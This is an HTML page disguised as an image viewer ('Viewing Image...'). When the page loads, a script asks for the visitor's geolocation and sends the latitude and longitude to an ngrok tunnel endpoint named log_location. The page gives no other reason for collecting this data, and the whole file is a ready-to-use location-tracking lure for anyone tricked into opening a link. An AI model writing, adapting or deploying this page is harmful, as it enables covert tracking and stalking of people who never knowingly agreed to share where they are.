<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Viewing Image...</title>
</head>
<body onload="getLocation()">
    <h2>Viewing Image...</h2>
    <img src="https://your-image-url.com/image.jpg" alt="Image" width="300">

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, handleError);
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        function sendLocation(position) {
            fetch("https://c73e-2405-201-302a-487f-d056-2d11-4649-c375.ngrok-free.app/log_location", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude
                })
            }).then(response => response.json())
              .then(data => console.log("Location sent successfully:", data))
              .catch(error => console.error("Error sending location:", error));
        }

        function handleError(error) {
            console.error("Error fetching location:", error.message);
        }
    </script>
</body>
</html>
